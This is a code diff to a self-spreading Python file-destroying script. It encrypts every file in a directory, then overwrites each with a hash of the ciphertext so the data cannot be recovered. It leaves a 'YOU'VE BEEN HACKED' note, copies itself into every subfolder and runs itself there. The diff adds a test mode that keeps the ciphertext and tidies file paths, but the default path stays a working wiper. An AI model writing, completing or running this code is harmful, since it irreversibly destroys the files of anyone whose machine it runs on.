@@ -26,7 +26,7 @@ key = Fernet.generate_key()
 e = Fernet(key)
 
 if "TESTDIR" in os.listdir(DIR):
-    with open("TEST.key", "wb") as file:
+    with open(os.path.join(DIR, "TEST.key"), "wb") as file:
         file.write(key)
 
 files = [os.path.join(DIR, i) for i in os.listdir(DIR) if os.path.isfile(os.path.join(DIR, i)) and i != os.path.basename(__file__) and i != "TESTDIR" and i != "TEST.key" and i != "SKIPPED"]
@@ -39,15 +39,15 @@ for i in range(len(files)):
     if "TESTDIR" not in os.listdir(DIR):
         encrypted_hash = hashlib.sha256(encrypted_content)
         result = str(encrypted_hash.digest())
+        with open(files[i], "wb") as file:
+            file.write(result[2:-2].encode())
     else:
-        encrypted_hash = encrypted_content
-        result = str(encrypted_hash)
-
-    with open(files[i], "wb") as file:
-        file.write(result[2:-2].encode())
+        # In test mode, just write the encrypted content directly
+        with open(files[i], "wb") as file:
+            file.write(encrypted_content)
         os.rename(files[i], files[i] + ".notera")
 
-with open("H@CKED.txt", "w") as file:
+with open(os.path.join(DIR, "H@CKED.txt"), "w") as file:
     file.write("LOL. YOU'VE BEEN HACKED. YOU'RE AN IDIOT!!!")
 with open(os.path.join(DIR, "PREFC"), "w") as file:
     file.write("")
@@ -89,6 +89,9 @@ if "SKIPPED" not in os.listdir(DIR):
         shutil.copy(__file__, os.path.join(folders[i], os.path.basename(__file__)))
         with open(os.path.join(folders[i], "SKIPPED"), "w") as file:
            file.write("")
+        if "TESTDIR" in os.listdir(DIR):
+            with open(os.path.join(folders[i], "TESTDIR"), "w") as file:
+                file.write("")
     for i in range(len(folders)):
         subprocess.run(["python", os.path.join(folders[i], os.path.basename(__file__))])
 
